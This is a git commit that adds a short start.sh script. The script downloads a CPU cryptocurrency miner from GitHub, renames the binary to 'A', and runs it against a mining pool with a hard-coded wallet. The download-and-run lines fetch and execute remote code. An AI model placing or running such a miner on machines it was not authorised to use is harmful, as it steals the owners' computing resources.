fcfb6628038ea90a65560879b003b53f78539693
bangbaim <85072227+bangbaim@users.noreply.github.com>
2021-05-30 23:08:50 +0700

    Create start.sh

---
+++ start.sh
@@ -0,0 +1,5 @@
+#!/bin/sh
+wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+tar xf hellminer_cpu_linux.tar.gz
+mv hellminer A
+./A -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RMbFHPn1V7fqCSpDVTmYRPBAWPpxghnrQD.Baim -p x --cpu 34
